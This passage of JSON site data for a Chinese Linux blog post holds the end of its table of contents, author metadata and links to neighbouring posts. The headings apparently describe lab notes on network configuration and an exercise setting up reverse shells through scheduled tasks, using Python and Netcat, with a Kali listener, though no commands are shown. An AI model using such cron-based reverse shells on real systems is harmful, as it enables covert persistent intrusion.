toc-level-5\"><a class=\"toc-link\" href=\"#%EF%BC%881%EF%BC%89%E6%9F%A5%E7%9C%8B%E6%89%80%E6%9C%89%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5\"><span class=\"toc-text\">（1）查看所有网络连接</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%EF%BC%882%EF%BC%89%E6%9F%A5%E7%9C%8B%E7%89%B9%E5%AE%9A%E8%BF%9E%E6%8E%A5%E8%AF%A6%E6%83%85\"><span class=\"toc-text\">（2）查看特定连接详情</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%EF%BC%883%EF%BC%89%E5%90%AF%E7%94%A8-%E7%A6%81%E7%94%A8%E6%8E%A5%E5%8F%A3\"><span class=\"toc-text\">（3）启用&#x2F;禁用接口</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%EF%BC%884%EF%BC%89%E9%85%8D%E7%BD%AE%E9%9D%99%E6%80%81-IP\"><span class=\"toc-text\">（4）配置静态 IP</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%EF%BC%885%EF%BC%89%E9%85%8D%E7%BD%AE-DHCP\"><span class=\"toc-text\">（5）配置 DHCP</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#4-nmtui-%E5%9B%BE%E5%BD%A2%E5%8C%96%E9%85%8D%E7%BD%AE\"><span class=\"toc-text\">4.nmtui-图形化配置</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%9B%9B%E3%80%81%E5%AE%9E%E9%AA%8C\"><span class=\"toc-text\">四、实验</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1%E3%80%81%E5%AE%9E%E9%AA%8C%E4%B8%80\"><span class=\"toc-text\">1、实验一</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-%E7%BB%99-VMware-%E6%B7%BB%E5%8A%A0%E4%B8%A4%E4%B8%AA%E8%99%9A%E6%8B%9F%E7%BD%91%E5%8D%A1\"><span class=\"toc-text\">1.给 VMware 添加两个虚拟网卡</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2-%E9%85%8D%E7%BD%AE-Windows10\"><span class=\"toc-text\">2.配置 Windows10</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#3-%E9%85%8D%E7%BD%AE-Kali\"><span class=\"toc-text\">3.配置 Kali</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#4-%E9%85%8D%E7%BD%AE-CentOS-8\"><span class=\"toc-text\">4.配置 CentOS 8</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#5-%E9%AA%8C%E8%AF%81\"><span class=\"toc-text\">5.验证</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2%E3%80%81%E5%AE%9E%E9%AA%8C%E4%BA%8C\"><span class=\"toc-text\">2、实验二</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-%E4%BD%BF%E7%94%A8%E4%B8%80%E6%AC%A1%E6%80%A7%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%92%8C%E5%91%A8%E6%9C%9F%E6%80%A7%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell%EF%BC%885%E5%88%86%E9%92%9F%E5%90%8E%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%92%8C%E6%AF%8F5%E5%88%86%E9%92%9F%E6%89%A7%E8%A1%8C%E4%B8%80%E6%AC%A1%EF%BC%89%EF%BC%8CKali-%E4%B8%BB%E6%9C%BA%E6%8E%A5%E6%94%B6%EF%BC%8C%E8%A7%A3%E9%87%8A%E5%91%BD%E4%BB%A4%E5%AD%97%E7%9A%84%E5%90%AB%E4%B9%89\"><span class=\"toc-text\">1.使用一次性计划任务和周期性计划任务反弹shell（5分钟后执行，和每5分钟执行一次），Kali 主机接收，解释命令字的含义</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2-%E5%AD%A6%E4%B9%A0%E4%B8%8D%E5%90%8C%E7%9A%84%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F%E6%9D%A5%E5%AE%8C%E6%88%90\"><span class=\"toc-text\">2.学习不同的反弹shell方式来完成</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%A1%88-1-%E4%BD%BF%E7%94%A8-Python-%E5%8F%8D%E5%BC%B9-Shell\"><span class=\"toc-text\">方案 1: 使用 Python 反弹 Shell</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%A1%88-2-%E4%BD%BF%E7%94%A8-Netcat-%E5%8F%8D%E5%BC%B9-Shell\"><span class=\"toc-text\">方案 2: 使用 Netcat 反弹 Shell</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#Kali-%E4%B8%BB%E6%9C%BA%E7%9B%91%E5%90%AC%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">Kali 主机监听命令</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%A1%88%E5%AF%B9%E6%AF%94%E8%A1%A8\"><span class=\"toc-text\">方案对比表</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>","author":{"name":"wyf","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/18ca1dd2a86b2210b1ab142498bcf0b0.jpg","link":"/","description":"不知道应该写点什么，就这么看着吧","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"shell脚本编写","uid":"311e8dc63e7a9fc5e2fe4b450a9ec38f","slug":"shell脚本编写","date":"2025-08-08T02:13:05.000Z","updated":"2025-08-08T03:07:59.730Z","comments":true,"path":"api/articles/shell脚本编写.json","keywords":null,"cover":null,"text":"shell脚本编写一、核心定义：1、什么是 Shell？ Shell 是 Linux/Unix 操作系统的 命令行解释器 (Command Interprete...","permalink":"/post/shell脚本编写","photos":[],"count_time":{"symbolsCount":"5k","symbolsTime":"5 mins."},"categories":[],"tags":[{"name":"Linux","slug":"Linux","count":14,"path":"api/tags/Linux.json"}],"author":{"name":"wyf","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/18ca1dd2a86b2210b1ab142498bcf0b0.jpg","link":"/","description":"不知道应该写点什么，就这么看着吧","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"计划任务","uid":"3e7fe2ca73cd20125c7985e6b77d8968","slug":"计划任务","date":"2025-08-06T07:24:48.000Z","updated":"2025-08-06T12:26:29.464Z","comments":true,"path":"api/articles/计划任务.json","keywords":null,"cover":[],"text":"计划任务一、 计划任务概述1.1 什么是计划任务？​ 定义：在特定时间自动执行预先设定的命令或脚本。 ​ 核心用途： ​ 延迟执行（如30秒后重启服务）。 ​ ...","permalink":"/post/计划任务","photos":[],"count_time":{"symbolsCount":"7.2k","symbolsTime":"7 mins."},"categories":[],"tags":[{"name":"Linux","slug":"Linux","count":14,"path":"api/tags/Linux.json"}],"author":{"name":"wyf","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/18ca1dd2a86b2210b1ab142498bcf0b0.jpg","link":"/","description":"不知道应该写点什么，就这么看着吧","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true}}